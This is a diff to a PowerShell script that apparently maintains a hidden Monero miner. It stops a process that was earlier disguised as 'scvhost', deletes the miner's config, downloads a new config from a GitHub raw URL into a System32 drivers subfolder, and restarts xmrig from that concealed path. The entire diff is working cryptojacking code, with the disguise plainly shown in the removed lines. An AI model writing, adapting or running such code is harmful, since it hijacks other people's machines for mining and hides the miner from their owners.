@@ -1,10 +1,23 @@
-Stop-Process -Name scvhost
+# Declared Values
+$output3 = "C:\Windows\System32\drivers\en-US\etc\sinker.json"
+$url3 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/XMR/sinker.json"
+$processpath = 'C:\Windows\System32\drivers\en-US\etc\'
+$processname = 'xmrig'
+$processtype = '.exe'
+
+
+# Stop running process
+Stop-Process -Name $processname
+
+
+# Delete existing config file
+Remove-Item $output3
 
 
 # Download Instructions
-$url2 = "https://raw.githubusercontent.com/diggles9991/MG/master/XMR/sinker.json"
-$output2 = "C:\Windows\System32\drivers\en-US\etc\sinker.json"
 Import-Module BitsTransfer
-Start-BitsTransfer -Source $url2 -Destination $output2
+Start-BitsTransfer -Source $url3 -Destination $output3
 
-Start-Process C:\Windows\System32\drivers\en-US\etc\scvhost.exe -ArgumentList "-c $output2"
+
+# Start Mining
+Start-Process $processpath+$processname+$processtype -ArgumentList "-c $output3"
